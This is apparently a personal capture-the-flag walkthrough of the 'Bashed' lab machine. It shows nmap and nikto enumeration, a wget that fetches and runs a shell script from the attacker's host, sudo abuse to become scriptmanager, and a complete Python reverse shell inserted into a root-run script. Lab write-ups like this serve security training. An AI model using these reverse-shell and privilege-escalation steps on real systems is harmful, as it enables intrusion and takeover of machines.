###############

Bash Machne
reverse shell
www-data escape
sudo -l no password escape
exploit crontab - python script

###############

1-Enummeration:
    └─$ nmap -T5 -sV -sC -Pn 10.10.10.68 -v
        PORT   STATE SERVICE VERSION
        80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        |_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
        |_http-title: Arrexel's Development Site
        |_http-server-header: Apache/2.4.18 (Ubuntu)



        nikto -h http://10.10.10.68
            http://10.10.10.68/dev/


        www-data@bashed
        :/home/arrexel# cat user.txt

            5866d65636868d81ab15505745a2e38f

    
        get a remote shell:
            www-data@bashed:/dev/shm# wget http://10.10.16.28:8000/shell.sh
            www-data@bashed: bash shell.sh


2-Priv Escalation:
    www-data@bashed:/dev/shm$ sudo -l
        sudo -l
        User www-data may run the following commands on bashed:
            (scriptmanager : scriptmanager) NOPASSWD: ALL

    
    www-data@bashed:
        sudo -u sciptmanager whoami


    We become "scriptmanager":
        www-data@bashed:/dev/shm$ sudo -u scriptmanager bash
                        sudo -u scriptmanager bash
        
        scriptmanager@bashed:/dev/shm$ 


    We found a script in python:
        test.py that is executed as a root, we insert a reverse shell in it:

            import socket,subprocess,os
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(("10.10.16.28", 4443))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            p=subprocess.call(["/bin/sh", "-i"])

